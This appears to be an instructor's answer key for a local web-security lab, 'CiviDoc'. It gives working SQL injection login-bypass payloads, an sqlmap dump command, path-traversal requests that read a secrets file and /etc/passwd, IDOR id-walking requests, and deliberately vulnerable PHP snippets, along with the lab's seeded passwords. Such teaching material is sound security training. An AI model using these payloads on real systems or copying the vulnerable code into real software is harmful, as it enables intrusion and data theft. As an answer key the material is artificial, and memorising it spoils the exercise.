# Solution — 07 CiviDoc (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the CiviDoc landing page; it advertises the portal and the API routes (medium
tier — the endpoints are discoverable from the app, not from a stock wordlist). The moving
parts:

- `GET|POST /portal/login` — portal sign-in (`email` / `password`).
- `GET /portal/documents` — the tenant's document list (download links).
- `GET /portal/documents/download?file=<name>` — streams a stored document by filename.
- `GET /api/invoices/{id}` — JSON invoice by id (route param).
- `GET /api/documents?id=<id>` — JSON document record by id (query param).
- `GET /health` — liveness JSON.

PostgreSQL 16 (`db.cividoc.lab`) is on the network. The app is a real Symfony 6.4 project
(`php:8.2-apache`, DocumentRoot `public/`), Doctrine DBAL for the database.

## Vector A — SQL injection on login (auth bypass + data dump)

`App\Repository\LegacyUserRepository::authenticate()` is a pre-ORM method that concatenates
`email` straight into the query (`src/Repository/LegacyUserRepository.php`):

```php
$sql = "SELECT id, email, display_name, role, tenant_id FROM app_user "
     . "WHERE email = '" . $email . "' AND password_sha256 = '" . $hash . "'";
$row = $this->conn->executeQuery($sql)->fetchAssociative();
```

The password is hashed before comparison, so the **email** field is the injection point.
Comment out the password check and you are logged in as the first row — the platform admin:

```sh
curl -s -i http://127.0.0.1:8507/portal/login \
  --data-urlencode "email=admin@cividoc.lab' -- " \
  --data-urlencode 'password=x'
```

returns `302 → /portal/documents` with an admin session. `' OR '1'='1' -- ` works too, and
`sqlmap` dumps the tables:

```sh
sqlmap -u http://127.0.0.1:8507/portal/login \
  --data='email=a@b.c&password=x' -p email --dbms=postgresql --batch --dump
```

This recovers every `app_user` row (emails + unsalted SHA-256 hashes) and, via UNION, the
`tenant` and `invoice` books — including `g.halvorsen@nordvik-maritime.example`.

## Vector D — path traversal on document download (exfiltration)

`PortalController::download()` joins the `file` query param to the document base dir with no
normalisation and no containment check (`src/Controller/PortalController.php`):

```php
$full = $this->documentDir . '/' . $file;   // documentDir = var/documents
$contents = @file_get_contents($full);
```

A legitimate download is `?file=welcome-cividoc.txt`. `../` escapes the base dir and reads
anything the `www-data` user can:

```sh
# Exfiltrate the seeded secrets file (loot: the DB password in DATABASE_URL)
curl -s "http://127.0.0.1:8507/portal/documents/download?file=../../../../secrets/cividoc.env"

# Arbitrary host file
curl -s "http://127.0.0.1:8507/portal/documents/download?file=../../../../../etc/passwd"
```

`var/documents` is at `/var/www/app/var/documents`, so four `../` reach `/var` (→
`/var/secrets/cividoc.env`) and five reach `/` (→ `/etc/passwd`). The secrets file leaks
`DATABASE_URL=postgresql://cividoc:cividoc-pg-prod-2024@db.cividoc.lab:5432/cividoc` — a valid
PostgreSQL credential for the in-scope database host.

## Vector G — IDOR on the invoice / document API (route AND query param)

Both API actions resolve the caller's "current tenant" from the session and then never use
it to constrain the lookup (`src/Controller/ApiController.php`). The lab seeds a browsing
session as tenant 1, so straight from curl you can read tenant 2's and tenant 3's records by
walking ids:

```sh
# Route param — your own tenant's invoice
curl -s http://127.0.0.1:8507/api/invoices/1001
# ...and another tenant's (Nordvik Maritime, tenant 2) — no 403
curl -s http://127.0.0.1:8507/api/invoices/1002
curl -s http://127.0.0.1:8507/api/invoices/1005

# Query param — another tenant's document record
curl -s "http://127.0.0.1:8507/api/documents?id=2003"
```

Invoice `1002` returns `billing_email = g.halvorsen@nordvik-maritime.example` with a
`tenant_id` of 2 while `_viewer_tenant` stays 1 — the proof of cross-tenant read. The
document IDOR (`?id=2003`) also yields `filename = msa-nordvik-2026.txt`, which then feeds the
download endpoint.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `landing-fingerprint` | `CiviDoc` | `GET http://127.0.0.1:8507/` |
| `tenant-billing-pii` | `g.halvorsen@nordvik-maritime.example` | PostgreSQL `tenant.billing_email` |
| `app-secrets-env` | `cividoc-pg-prod-2024` (DB password) | `app:/var/secrets/cividoc.env` |

### psql auth form (loot `tenant-billing-pii`)

`labctl` runs it inside the db container via a connection URI (password embedded, so OS user
is irrelevant):

```sh
docker compose exec -T db \
  psql "postgresql://cividoc:cividoc-pg-prod-2024@localhost:5432/cividoc" \
  -tAc "SELECT billing_email FROM tenant ORDER BY id"
```

### Seeded data

- **Tenants:** Harbor Ledger Group (`a.stein@harbor-ledger.example`, id 1), Nordvik Maritime
  (`g.halvorsen@nordvik-maritime.example`, id 2), Pike & Rosen Advisory
  (`accounts@pike-rosen.example`, id 3).
- **Portal users** (unsalted SHA-256; plaintexts are lab-local, not in stock wordlists —
  the SQLi makes them unnecessary anyway):
  `admin@cividoc.lab` / `Civi!Doc-Adm1n-26` (admin, tenant 1),
  `j.okafor@harbor-ledger.example` / `Harbor-Ledger!7788` (tenant 1),
  `g.halvorsen@nordvik-maritime.example` / `Nordvik-Mar1time#42` (tenant 2),
  `m.rossi@pike-rosen.example` / `Pike&Rosen-2026` (tenant 3).
- **Invoices:** ids `1001`–`1005` spread across the three tenants.
- **Documents:** ids `2001`–`2004`; files live in `var/documents/`.

## Reset

`make lab-restore LAB=07-medium-symfony` (recreate — drops the PostgreSQL volume and re-seeds
from `db/seed/01-schema.sql`).
